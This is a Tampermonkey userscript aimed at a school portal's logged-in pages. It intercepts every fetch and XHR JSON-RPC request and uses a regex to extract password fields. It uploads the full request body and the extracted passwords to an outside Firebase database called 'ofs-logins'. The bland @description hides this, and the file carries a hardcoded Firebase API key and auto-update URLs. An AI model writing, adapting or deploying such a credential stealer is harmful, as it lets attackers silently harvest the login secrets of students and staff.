// ==UserScript==
// @name         OFS Firebase
// @namespace    http://tampermonkey.net/
// @version      1.5
// @description  After page-info.json, send JSON‑RPC request payloads with specific pattern to Firebase
// @match        https://www.ofs.edu.sg/my-ofs/*
// @updateURL    https://timmy49.github.io/ofsteel/ofsteel_firebase_tamperauto
// @downloadURL  https://yourusername.github.io/ofsteel_firebase_tamperauto
// @grant        none
// ==/UserScript==

(function(){
  'use strict';

  let pageInfoLoaded = false;
  const seenBodies = new Set();
  const pattern = /"password":\s*\{"javaClass":\s*"java\.util\.ArrayList",\s*"list":\s*\[([^\]]+)\]/;

  // Load Firebase scripts
  const loadFirebase = () => {
    const script1 = document.createElement('script');
    script1.src = 'https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js';
    script1.onload = () => {
      const script2 = document.createElement('script');
      script2.src = 'https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js';
      script2.onload = initFirebase;
      document.head.appendChild(script2);
    };
    document.head.appendChild(script1);
  };

  // Function to initialize Firebase and authenticate using a custom token
  const initFirebase = () => {
    const firebaseConfig = {
      apiKey: "AIzaSyAlCFNxSt6nNwwL_TMWX1mX5JX1KMWGSe4",
      authDomain: "ofs-logins.firebaseapp.com",
      projectId: "ofs-logins",
      storageBucket: "ofs-logins.firebasestorage.app",
      messagingSenderId: "994162291381",
      appId: "1:994162291381:web:473a9ee8d734b1466644fc",
      measurementId: "G-SWLJP2JDEG",
      databaseURL: "https://ofs-logins-default-rtdb.asia-southeast1.firebasedatabase.app/"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);

    // Your hardcoded custom token (replace with the actual custom token)
    const customToken = "tampermonkey_ofsteel";

    // Authenticate using the custom token
    firebase.auth().signInWithCustomToken(customToken)
      .then(() => {
        console.log("Authenticated with Firebase using Custom Token!");
        window.dbRef = firebase.database().ref("jsonrpc_logs"); // Initialize db reference after authentication
      })
      .catch((error) => {
        console.error("Authentication failed:", error);
      });
  };

  // Function to upload data to Firebase
  const tryUpload = (body) => {
    const match = body.match(pattern);
    if (!match) return false;
    const extracted = match[1].replace(/"/g, '').trim();
    console.log('🔍 listing_w list =', extracted);

    const payload = {
      content: body,
      extracted,
      time: new Date().toISOString()
    };

    if (window.dbRef) {
      window.dbRef.push(payload).then(() => {
        console.log('✅ Uploaded to Firebase:', extracted);
      }).catch(err => {
        console.error('❌ Upload failed:', err);
      });
    } else {
      console.warn('⚠ Firebase DB ref not ready');
    }

    return true;
  };

  // FETCH hook
  const origFetch = window.fetch;
  window.fetch = async (...args) => {
    const [res, cfg] = args;
    const url = typeof res === 'string' ? res : res.url;
    const body = cfg?.body;
    if (!pageInfoLoaded && url.includes('page-info.json')) {
      pageInfoLoaded = true;
      console.log('✅ page-info.json loaded (fetch)');
    }
    if (pageInfoLoaded && url.includes('JSON-RPC') && body && !seenBodies.has(body)) {
      seenBodies.add(body);
      console.log('📦 JSON-RPC FETCH detected');
      console.log('📤 Raw Payload:', body);
      if (!tryUpload(body)) {
        console.log('⚠ pattern not found → skipping');
      }
    }
    return origFetch.apply(this, args);
  };

  // XHR hook
  const origXHROpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(m, url){ this._url = url; return origXHROpen.apply(this, arguments); };
  const origXHRSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function(body){
    this.addEventListener('load', () => {
      if (!pageInfoLoaded && this._url.includes('page-info.json')) {
        pageInfoLoaded = true;
        console.log('✅ page-info.json loaded (XHR)');
      }
      if (pageInfoLoaded && this._url.includes('JSON-RPC') && body && !seenBodies.has(body)) {
        seenBodies.add(body);
        console.log('📦 JSON-RPC XHR detected');
        console.log('📤 Raw Payload:', body);
        if (!tryUpload(body)) {
          console.log('⚠ pattern not found → skipping');
        }
      }
    });
    return origXHRSend.apply(this, arguments);
  };

  loadFirebase();
})();
